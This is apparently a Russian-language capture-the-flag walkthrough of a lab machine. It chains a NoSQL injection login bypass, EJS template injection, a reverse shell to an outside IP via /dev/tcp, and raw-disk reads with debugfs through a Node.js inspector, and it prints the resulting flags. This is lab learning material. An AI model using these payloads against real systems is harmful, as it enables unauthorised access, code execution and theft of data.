**Теги:** Boot2Root, Web
**Сложность:** Medium.

## 1. Разведка

Начинаем со сканирования цели с помощью Nmap:

```bash
sudo nmap -sS -sV 10.112.149.107
```

Вывод:

```text
[sudo] password for deb88:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 11:10 EDT
Nmap scan report for 10.112.149.107
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Открыты:

* `22/tcp` — SSH;
* `80/tcp` — HTTP, Node.js / Express.

---

## 2. Перечисление директорий

Используем Gobuster:

```bash
gobuster dir -u 10.112.149.107 -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

Результат:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.149.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 23] [--> /]
/staff                (Status: 403) [Size: 1547]
```

Особенно интересен `/staff`: без авторизации он возвращает `403 Forbidden`.

---

## 3. Дополнительное сканирование

Запускаем Nuclei:

```bash
nuclei -u 10.112.149.107 -severity low,medium,high,critical
```

Сканирование завершилось без найденных уязвимостей:

```text
[INF] Scan completed in 1m. 0 matches found.
```

Также был выполнен активный скан ZAP:

Автоматические сканеры не обнаружили интересующей нас уязвимости.

Проверяем поддерживаемые HTTP-методы:

```bash
nmap --script http-methods -p80 10.112.149.107
```

Получаем:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 12:06 EDT
Nmap scan report for 10.112.149.107
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

---

# 4. NoSQL Injection в форме входа

Поскольку приложение написано на Node.js, проверяем форму авторизации на возможную **NoSQL-инъекцию**.

Пробуем различные варианты параметров, например:

```text
username[$regex]=.*&password[$ne]=1
```

В некоторых случаях сервер отвечает `302`, тогда как большинство запросов получают `401`:

```text
пробуем nosql иньекцию

username[$regex]=.*&password[$ne]=1 и другие
видим что в некоторых случаях выдает 302 но в большинстве 401
```

Далее используем:

```text
username=attendant&password[$ne]=1
```

В результате получаем успешную аутентификацию:

```text
HTTP/1.1 302 Found
X-Powered-By: Express
Location: /staff
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 35
Set-Cookie: connect.sid=s%3A6VIe29su62233ONbNqsws8zhjOD6xZIu.UzO6WUX5CMo0DjCA5HOCLnxnJNB9sicycOdB%2BI4NC%2Fk; Path=/; HttpOnly
Date: Tue, 04 Aug 2026 16:55:29 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<p>Found. Redirecting to /staff</p>
```

Таким образом, удалось войти как пользователь `attendant`, не зная его настоящего пароля.

---

# 5. Доступ к `/staff`

Используем полученную cookie-сессию:

```bash
curl -i -b cookies.txt \
http://10.112.149.107/staff
```

Получаем:

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2146
ETag: W/"862-sls+S+gGAwkT1qYwK2r9CPPd9u4"
Date: Tue, 04 Aug 2026 16:58:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

В HTML страницы указано:

```html
<div class="lotus">&mdash; staff console &mdash;</div>
<h1>Cabana Desk</h1>
<p class="sub">Signed in as <strong>attendant</strong>. Customise the guest booking-confirmation message below.</p>
```

Форма отправляет данные на:

```text
/staff/preview
```

А само поле помечено как EJS template:

```html
<textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
```

Таким образом, мы получаем доступ к функции предварительного просмотра EJS-шаблонов.

---

# 6. Обнаружение SSTI

Проверяем, действительно ли введённый EJS-код исполняется.

Используем:

```text
<%= 7*7 %>
```

В ответ получаем:

```text
49
```

Это подтверждает **Server-Side Template Injection (SSTI)** в EJS.

Теперь можно обращаться к объектам Node.js.

Проверяем версию Node.js:

```text
<%= process.version %>
```

Результат:

```text
v22.23.1
```

Проверяем текущую рабочую директорию:

```text
<%= process.cwd() %>
```

Получаем:

```text
/opt/poolside
```

---

# 7. Исследование окружения Node.js

Для просмотра переменных окружения используем:

```text
<%= JSON.stringify(process.env) %>
```

Результат:

```text
{"LANG":"C.UTF-8","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin","USER":"poolside","LOGNAME":"poolside","HOME":"/home/poolside","INVOCATION_ID":"eca4e3268c66454f9edec6fe2316d6fd","JOURNAL_STREAM":"10:6288","SYSTEMD_EXEC_PID":"600","MEMORY_PRESSURE_WATCH":"/sys/fs/cgroup/system.slice/poolside.service/memory.pressure","MEMORY_PRESSURE_WRITE":"c29tZSAyMDAwMDAgMjAwMDAwMAA=","NODE_ENV":"production"}
```

В частности, видим:

```text
USER=poolside
HOME=/home/poolside
NODE_ENV=production
```

Также перечисляем глобальные объекты:

```text
<%= Object.keys(globalThis).join(",") %>
```

Результат:

```text
global,clearImmediate,setImmediate,clearInterval,clearTimeout,setInterval,setTimeout,queueMicrotask,structuredClone,atob,btoa,performance,fetch,navigator,crypto
```

И свойства `process`:

```text
<%= Object.keys(process).join(",") %>
```

Среди них присутствует:

```text
getBuiltinModule
```

Именно этот метод позволяет получить доступ к встроенным модулям Node.js.

---

# 8. Чтение исходного кода приложения

Используем встроенный модуль `fs`:

```text
<%= process.getBuiltinModule("fs").readFileSync("/opt/poolside/app.js","utf8") %>
```

Получаем исходный код приложения.

В нём используются:

```javascript
const express = require('express');
const session = require('express-session');
const ejs = require('ejs');
const Datastore = require('@seald-io/nedb');
const crypto = require('crypto');
```

Порт задаётся через:

```javascript
const PORT = process.env.PORT ? Number(process.env.PORT) : 80;
```

А приложение использует сессии:

```javascript
app.use(session({
  secret: 'byte-lotus-poolside',
  resave: false,
  saveUninitialized: false,
}));
```

В качестве базы данных используется NeDB:

```javascript
const db = new Datastore();
```

---

# 9. Анализ авторизации

Особенно интересна функция `seed()`:

```javascript
async function seed() {
  await db.removeAsync({}, { multi: true });
  await db.insertAsync([
    { username: 'guest', password: 'sunshine', role: 'guest' },
    { username: 'attendant', password: crypto.randomBytes(18).toString('hex'), role: 'staff' },
  ]);
}
```

Она показывает две учётные записи:

```text
guest / sunshine
attendant / случайный пароль
```

Пароль `attendant` генерируется случайно, поэтому обычным перебором его получить нельзя.

Проверяем функцию входа:

```javascript
user = await db.findOneAsync({ username, password });
```

После успешного поиска создаётся сессия:

```javascript
req.session.user = { username: user.username, role: user.role };
```

А затем пользователь перенаправляется на `/staff`:

```javascript
return res.redirect('/staff');
```

---

# 10. SSTI → чтение файлов

После получения произвольного выполнения JavaScript через EJS можно использовать `fs` для чтения локальных файлов.

Используем:

```text
<%= process.getBuiltinModule('fs').readFileSync('/home/poolside/user.txt','utf8') %>
```

Получаем user.txt:

```text
THM{w4rm_s3ss10n_h1j4ck3d}
```

---

# 11. Получение reverse shell

SSTI позволяет не только читать файлы, но и получить выполнение команд через встроенный модуль `child_process`.

Используем:

```text
<%= process.getBuiltinModule('child_process').execSync('bash -c "bash -i >& /dev/tcp/192.168.154.82/4444 0>&1"').toString() %>
```

В результате получаем reverse shell.

Теперь имеем shell от имени пользователя `poolside`.

---

# 12. Локальное перечисление

После получения shell выполняем стандартное локальное перечисление.

Корневой каталог не отличается.

Затем запускаем LinPEAS.

Текущий пользователь:

```text
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

Таким образом, reverse shell работает от имени:

```text
poolside
```

---

# 13. Поиск уязвимостей ядра

LinPEAS обнаруживает несколько потенциальных kernel vulnerabilities:

```text
CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=6.19,ver<7.0.10 | Tags: 1 | Rank: Fixed in stable 7.0.10 and mainline 7.1
CVE: CVE-2026-46331 | Name: pedit COW | Match data: pkg=linux-kernel,ver>=6.19,ver<7.0.13 | Tags: 1 | Rank: Fixed in stable 7.0.13 and mainline 7.1
CVE: CVE-2026-46333 | Name: ptrace exit-race | Match data: pkg=linux-kernel,ver>=6.19,ver<7.0.8,cmd:[ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 0)" -lt 2 ] | Tags: 1 | Rank: Upstream issue introduced in 4.10; fixed in 7.0.8; mitigated by kernel.yama.ptrace_scope >= 2
```

LinPEAS сообщает:

```text
Kernel vulns found: 3
```

Также обнаружены:

```text
CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6
CVE-2026-43500 (rxrpc): autoloadable: rxrpc
modprobe mitigation (xfrm-ESP): not found
modprobe mitigation (rxrpc): not found
Unprivileged user namespaces: enabled
LIKELY VULNERABLE to CVE-2026-43284 (xfrm-ESP).
LIKELY VULNERABLE to CVE-2026-43500 (rxrpc).
```

Однако эти варианты нельзя проверить, поскольку в системе  `gcc`, а найденные эксплойты написаны на C.
Но и установить gcc мы не можем.

---

# 14. Анализ процессов

Выполняем:

```bash
ps -ef --forest
```

Среди процессов обнаруживаем:

```text
root         599       1  0 07:32 ?        00:00:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
poolside     600       1  0 07:32 ?        00:00:00 /usr/bin/node app.js
```

Особенно интересен процесс:

```text
/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

Он запущен от имени `root` и слушает Node.js Inspector на `127.0.0.1:9229`.

---

# 15. Проверка Node.js Inspector

Проверяем порт `9229`:

```bash
ss -lntp | grep 9229
```

Получаем:

```text
LISTEN 0      511        127.0.0.1:9229      0.0.0.0:*
```

Inspector доступен только локально.

Запрашиваем его API:

```bash
curl http://127.0.0.1:9229/json
```

Получаем:

```json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "97963f1e-7746-414a-aef6-b135fbd023dc",
  "title": "processor.js",
  "type": "node",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc"
} ]
```

Таким образом, мы получаем WebSocket endpoint для Node.js Inspector:

```text
ws://127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc
```

---

# 16. Подключение к Node Inspector

Проверяем расположение и версию Node.js:

```bash
which node
```

```text
/usr/bin/node
```

И:

```bash
node -v
```

Получаем:

```text
v22.23.1
```

Создаём `/tmp/debug.js`:

```bash
cat > /tmp/debug.js <<'EOF'
const ws = new WebSocket("ws://127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc");

ws.onopen = () => {
    console.log("[+] connected");

    ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
            expression: "process.getuid()"
        }
    }));
};

ws.onmessage = (event) => {
    console.log(event.data);
};
EOF
```

Запускаем:

```bash
node /tmp/debug.js
```

Сначала выясняем UID процесса:

```text
[+] connected
{"id":1,"result":{"result":{"type":"number","value":995,"description":"995"}}}
```

UID равен:

```text
995
```

То есть выполнение происходит не от имени `root`. 

---

# 17. Определение пользователя процесса Inspector

Используем встроенный Node Inspector REPL:

```bash
node inspect 127.0.0.1:9229
```

Затем:

```text
>> repl
```

Проверяем UID:

```text
>> process.getuid()
995
```

Получаем информацию о текущем процессе:

```text
>> process.getBuiltinModule('child_process').execSync('id').toString()
```

Ответ:

```text
'uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n'
```

Таким образом, процесс `processor.js` выполняется от имени:

```text
pipelinesvc
```

но состоит в группе:

```text
disk
```

Это важная находка, поскольку группа `disk` предоставляет прямой доступ к блочным устройствам системы.

---

# 18. Использование доступа к диску

Имея доступ к устройству диска через группу `disk`, используем Node.js Inspector для выполнения `debugfs`.

Команда:

```text
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', '  cat  /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

Здесь `debugfs` получает команду:

```text
cat /root/root.txt
```

и работает непосредственно с разделом:

```text
/dev/nvme0n1p1
```

В результате содержимое `/root/root.txt` удаётся прочитать напрямую с файловой системы:

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```
---

# Итоговая цепочка

```text
Nmap
  │
  ▼
HTTP / Express
  │
  ▼
NoSQL Injection
username=attendant&password[$ne]=1
  │
  ▼
/staff
  │
  ▼
EJS Template
  │
  ▼
SSTI
<%= 7*7 %>
  │
  ▼
Node.js process object
  │
  ├── чтение app.js
  ├── чтение user.txt
  └── child_process
          │
          ▼
      Reverse Shell
          │
          ▼
      poolside
          │
          ▼
      LinPEAS
          │
          ▼
      Node.js Inspector :9229
          │
          ▼
      processor.js
          │
          ▼
      pipelinesvc
      groups=...,6(disk)
          │
          ▼
      debugfs
          │
          ▼
      /dev/nvme0n1p1
          │
          ▼
      /root/root.txt
          │
          ▼
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

## Флаги

**User:**

```text
THM{w4rm_s3ss10n_h1j4ck3d}
```

**Root:**

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

